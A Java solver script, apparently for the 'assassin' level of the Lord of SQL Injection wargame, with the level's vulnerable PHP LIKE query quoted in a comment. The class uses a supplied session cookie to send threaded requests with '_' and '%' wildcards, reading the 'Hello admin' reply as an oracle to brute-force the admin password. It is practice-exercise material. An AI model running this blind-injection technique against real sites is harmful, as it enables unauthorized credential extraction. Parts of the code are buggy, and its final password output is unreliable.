import java.io.*;
import java.util.*;
import java.net.*;
import java.util.concurrent.*;

/**
 * solving los problem example
 * @author imscs21
 * @url https://github.com/imscs21/los
 * 
 */
/*  ====P-R-O-B-L-E-M====
 * 
 *
 <?php 
 include "./config.php"; 
 login_chk(); 
 dbconnect(); 
 if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
 $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
 echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
 $result = @mysql_fetch_array(mysql_query($query)); 
 if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
 if($result['id'] == 'admin') solve("assassin"); 
 highlight_file(__FILE__); 
 ?>
 * 
 */


public class Assassin
implements Runnable
{
	HttpURLConnection conn=null;
	public static String getContent(InputStream ism) throws IOException{
		StringBuffer sb = new StringBuffer();
		//BufferedReader br = new BufferedReader(new BufferedInputStream(ism));
		DataInputStream dis = new DataInputStream(ism);
		String l;
		while((l=dis.readLine())!=null){
			sb.append(l);
		}
		dis.close();

		final String result = sb.toString();
		sb=null;
		return result;
	}
	public static String queryContent(Configure conf,String sub_query)throws Exception{
		return queryContent(conf,conf.getCookieContent(),sub_query);
	}
	public static String queryContent(Configure conf,String cookie_content,String sub_query) throws Exception{
		HttpURLConnection conn =(HttpURLConnection) new URL(conf.getURL()+sub_query).openConnection();
		conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36");
		conn.addRequestProperty("Cookie",cookie_content);
		conn.connect();
		InputStream ism = conn.getInputStream();
		final String content = getContent(ism);
		ism.close();
		conn.disconnect();
		conn=null;
		return content;
	}
	public static boolean solveNow(Configure conf,String fullanswer,boolean pwVarOnly) throws Exception{
		Scanner sc = new Scanner(System.in);
		System.out.print("would you want to clear this level on this program?[y/n] ");
String content;
		final String resp = sc.next();
		final String fnt = pwVarOnly?"pw=%s":"%s";
		if(resp.equals("y")||resp.equals("Y")){

			System.out.println("applying...");
			String sub_query = "?"+String.format(fnt,URLEncoder.encode( fullanswer));
			content=queryContent(conf,sub_query);

			if(isSuccessAndIsClear(content)||isClear(resp)){
				System.out.println("Stage Clear!");
				return true;
			}else{
				sub_query = "?"+String.format(fnt, fullanswer);
				content=queryContent(conf,sub_query);

				if(isSuccessAndIsClear(content)||isClear(content)){
					System.out.println("Stage Clear!");
					return true;
				}else{//tested on only mac (java ver 1.8.91) and windows NT isn`t seemed to be compatible on encoding(windows java ver 1.8.111 - x86) with string variable
					System.out.println("failed...(please apply on another java environment , and Integer Numbers in found:: logs are accurate data.)");
				
					}
					return false;
			}
		}
		return false;
	}
	
	public static boolean isSuccess(String resp,String[] acclst){
		boolean rst = false;
		for(String acc:acclst){
			rst = rst||resp.contains("<h2>Hello "+acc);
			if(rst){
				break;
			}
		}
		return rst;
	}

	public static boolean isSuccess(String resp){
		return isSuccessWithAdmin(resp)||isSuccessWithGuest(resp);
		}
	public static boolean isSuccessWithAdmin(String resp){
		return isSuccess(resp,new String[]{"Admin","admin"});
	}
	public static boolean isSuccessWithGuest(String resp){
		return isSuccess(resp,new String[]{"guest","Guest"});
		
	}
	public static boolean isSuccessAndIsClear(String resp){
		return isSuccess(resp)&&isClear(resp);
	}
	public static boolean  isClear(String resp){
		return resp.contains(" Clear!");
	}
	public ArrayList<String> getSupportedBasicAsciiCodes(final Configure conf,final ThreadPoolExecutor tpe,final boolean urlencode,boolean supportFileCache){
		final ArrayList<String> rst = new ArrayList<String>();
		File f = new File("lst.dat");
		boolean resp = false;
		if(supportFileCache){
			Scanner sc = new Scanner(System.in);
			System.out.print("load data from file?[y/n] ");
			resp = sc.next().equals("y");
			
		}
		if(resp){
			try{
				ArrayList<String> tmp=loadListFromFile(f);
				for(String t:tmp){
					rst.add(t);
				}
			}catch(Exception e){
				
			}
		}
		if (rst.size()==0){

		final char[] sync = new char[1];
		final char offset = 1;
		final char max_rng = 128;
		 char max_len = max_rng-offset;
		for(char i =offset;i<max_rng;i++){
			final char c = i;
			if(Character.toString(c).equals("%")||Character.toString(c).equals("_"))
				max_len--;
		  else
			tpe.execute(new Runnable(){
			@Override
			public void run(){
				try{
			String s = Character.toString( c);
			String sub_query = "?pw="+URLEncoder.encode(String.format( "%%%s%%", s));
			String content=queryContent(conf,sub_query);
			if(isSuccessWithGuest(content)){
				if(urlencode){
					s=URLEncoder.encode(s);
				}
				rst.add(s);
				
			}
					synchronized(sync){
						sync[0]++;
					}
			}catch(Exception e){e.printStackTrace(System.out);}
			}});
		}
		while(true){
			synchronized(sync){
			if(sync[0]>=max_len){
				break;
			}}
			try{
				Thread.sleep(500*2);
			}catch(Exception e){}
			
		}
		if(supportFileCache){
			try{
			saveListOnFile(f,rst);
			}catch(Exception e){e.printStackTrace(System.out);}
		}
		}
		
		return rst;
	}
	public static void waitTask(ThreadPoolExecutor tpe){
		while (tpe.getTaskCount()!=tpe.getCompletedTaskCount()){try{ Thread.sleep(500);}catch(Exception e2){}}
		
	}
	protected void saveListOnFile(File f,ArrayList<String> lst) throws Exception{
		OutputStream osm = new FileOutputStream(f);
		ObjectOutputStream dos = new ObjectOutputStream(osm);
		dos.writeObject(lst);
		System.out.println("save work");
		dos.flush();
		dos.close();
		osm.close();
		System.out.println("save close");
	}
	protected ArrayList<String> loadListFromFile(File f) throws Exception{
		ArrayList<String> rst = new ArrayList<String>();
		InputStream osm = new FileInputStream(f);
		ObjectInputStream dos = new ObjectInputStream(osm);
		rst=(ArrayList<String>)dos.readObject();
		System.out.println("load work");
		dos.close();
		osm.close();
		System.out.println("load close");
		return rst;
	}
	ArrayList<String> lst;
	public void run(){
		final Configure conf = new Configure();
		if(conf.getToken().equals("exit")){
			return;
		}

		try{
			
			String rst = "";
			
			ThreadPoolExecutor tpe = new ThreadPoolExecutor( 4, 20, 60, TimeUnit.SECONDS, new LinkedBlockingQueue  <Runnable>()  );
	       int slen = 0;
	       
		   final int[] sync = new int[2];
		   sync[1]=1;
		   final ArrayList<Integer> leng_lst = new ArrayList<Integer>();
		   final int length_limit = 16+1;
		   String ii = "";
			while(true){
				
				final String i = (ii+="_");
				if(i.length()>=length_limit){
					break;
				}
				tpe.execute(new Runnable(){
					@Override
					public void run(){
						int nowstate ;
						synchronized(sync){
							nowstate = sync[0];
						}
						if(nowstate==0){
							try{
							String content = queryContent(conf,"?pw="+i);
							if(isSuccess(content)){
								System.out.println("found index: "+i.length());
								leng_lst.add(i.length());
							}
							if(i.length()>=length_limit-1){
								sync[0]=1;
							}
							}catch(Exception e2){
								e2.printStackTrace(System.out);
							}
						}
					}
				});
				
			}
			waitTask(tpe);
			java.util.Collections.sort(leng_lst);
			for(int l:leng_lst){
				System.out.println("length: "+l);
			}
			//slen=sync[0];
			ArrayList<String> tt = getSupportedBasicAsciiCodes(conf,tpe,false,true);
	System.out.println("size: "+tt.size());
	for(String ts:tt){
		System.out.printf("value: %s(%s)\n",ts, URLDecoder.decode(ts));
	}
	 lst = new ArrayList<String>();
	for(final String str:tt){
		tpe.execute(new Runnable(){
			@Override
			public void run(){
				try{
		String sub_query = "?pw="+String.format("%s%%",URLEncoder.encode( str));
		String content = queryContent(conf,sub_query);
		if(isSuccess(content)){
			lst.add(str);
		}
				}catch(Exception e2){}
		}});
	}
	waitTask(tpe);
	while(leng_lst.size()>0){
		final ArrayList<String> nxt_lst = new ArrayList<String>();
		boolean checkAns = false;
		for(String ori:lst){
			if(leng_lst.size()>0&&ori.length()==leng_lst.get(0)){
				
				checkAns=true;
				String sub_query = "?pw="+String.format("%s%%",URLEncoder.encode( ori));
				String content = queryContent(conf,sub_query);
				if(isSuccessWithAdmin(content)){
					if(isClear(content)){
						System.out.println("Answer is found and stage is cleared!");	
						System.out.println(String.format( "Password is '%s'",ori));
						System.out.println(String.format( "Password is '%s'",URLEncoder.encode( ori)));
						
						
					}
					nxt_lst.add(ori);
					
				}
			}else{
				for(String t:tt){
					tpe.execute(new Runnable(){
						@Override
						public void run(){
							try{
					final String johap = ori+t;
					String sub_query = "?pw="+String.format("%s%%",URLEncoder.encode( johap));
					String content = queryContent(conf,sub_query);
					if(isSuccess(content)){
						System.out.println("added:: "+johap);
						nxt_lst.add(johap);
					}
					}catch(Exception e2){}}});
				}
				waitTask(tpe);
				
			}
			
		}
		if(checkAns){
			leng_lst.remove(0);
		}
		else{
			lst=nxt_lst; 
		}
		
	}
	
	try{
		tpe.purge();
		tpe.shutdownNow();
		tpe.awaitTermination(10,TimeUnit.SECONDS );
	}catch(Exception e2){}
	tpe=null;
	System.out.println("stop");
	
			
			System.out.println(String.format( "Password is '%s'",rst));
			System.out.println(String.format( "Password is '%s'",URLEncoder.encode( rst)));
			
			//solveNow(conf,rst,true);

		}catch(Exception e){
			e.printStackTrace(System.out);
		}
		finally{
			Scanner sc = new Scanner(System.in);
			sc.next();
			System.exit(1);
		}
	}
	
	public static void main(String... args){
		
			//int idx = 2;
			//Runnable bi=null;
			for(int idx=0;idx<Thread.currentThread().getStackTrace().length;idx++){
			try{
				Object obj =Class.forName(Thread.currentThread().getStackTrace()[idx].getClassName()).newInstance(); // new Xavis();//getClass().newInstance();
			if(obj!=null&&obj instanceof Runnable&&!(obj instanceof Thread)){
			System.out.println( Thread.currentThread().getStackTrace()[idx].getClassName());
			Thread th = new Thread((Runnable)obj);
			th.start();
			try{th.join();}catch(Exception e2){}
				
			}
			}catch(Exception e){
				
			}
			}
				
	

		System.out.println("program finish");
	}
	protected static class Configure{
		protected String token="",mUrl="";
		public String setToken(String tk){
			token=tk;
			return tk;
		}
		public String setURL(String url){
			mUrl=url;
			return url;
		}
		public String getURL(){
			return mUrl;
		}
		public String getToken(){
			return token;

		}
		public String getCookieContent(){
			return  "PHPSESSID="+getToken()+";";
		}
		public final static String file_version = "3.2";
		public Configure(){
			Scanner sc = new Scanner(System.in);
			System.out.println("File Version= "+file_version);
			System.out.print("input session tokenqqq: ");
			String ans = sc.next();
			setToken(ans);
			System.out.print("input url: ");
			setURL(sc.next());
			System.out.println();

		}
	}
